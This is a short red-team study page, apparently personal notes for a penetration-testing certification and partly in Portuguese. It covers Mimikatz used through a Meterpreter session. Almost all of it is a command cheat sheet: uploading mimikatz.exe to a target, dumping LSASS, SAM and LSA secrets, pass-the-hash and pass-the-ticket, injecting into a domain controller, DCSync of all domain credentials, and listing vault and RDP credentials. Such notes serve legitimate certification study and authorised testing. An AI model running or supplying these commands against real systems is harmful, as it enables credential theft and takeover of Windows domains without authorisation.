> For the complete documentation index, see [llms.txt](https://savitar.gitbook.io/mynotes/llms.txt). Markdown versions of documentation pages are available by appending `.md` to page URLs; this page is available as [Markdown](https://savitar.gitbook.io/mynotes/certifications-and-notes/red-team/cpts/using-metasploit-framework/meterpreter-commands/mimikatz.md).

# Mimikatz

* &#x20;O Mimikatz pode extrair hashes da memória do processo lsass.exe, onde os hashes são armazenados em cache.
* Carregar o arquivo de extensão Mimikatz em uma sessão meterpreter:

```sh
upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe
```

* **Comandos**

```bash
- Dump LSASS:
privilege::debug
token::elevate
sekurlsa::logonpasswords

- (Over) Pass The Hash
privilege::debug
sekurlsa::pth /user:<UserName> /ntlm:<> /domain:<DomainFQDN>

- List all available kerberos tickets in memory
sekurlsa::tickets

- Dump local Terminal Services credentials
sekurlsa::tspkg

- Dump and save LSASS in a file
sekurlsa::minidump c:\temp\lsass.dmp

- List cached MasterKeys
sekurlsa::dpapi

- List local Kerberos AES Keys
sekurlsa::ekeys

- Dump SAM Database
lsadump::sam

- Dump SECRETS Database
lsadump::secrets

- Inject and dump the Domain Controler's Credentials
privilege::debug
token::elevate
lsadump::lsa /inject

- Dump the Domain's Credentials without touching DC's LSASS and also remotely
lsadump::dcsync /domain:<DomainFQDN> /all

- List and Dump local kerberos credentials
kerberos::list /dump

- Pass The Ticket
kerberos::ptt <PathToKirbiFile>

- List TS/RDP sessions
ts::sessions

- List Vault credentials
vault::list
```
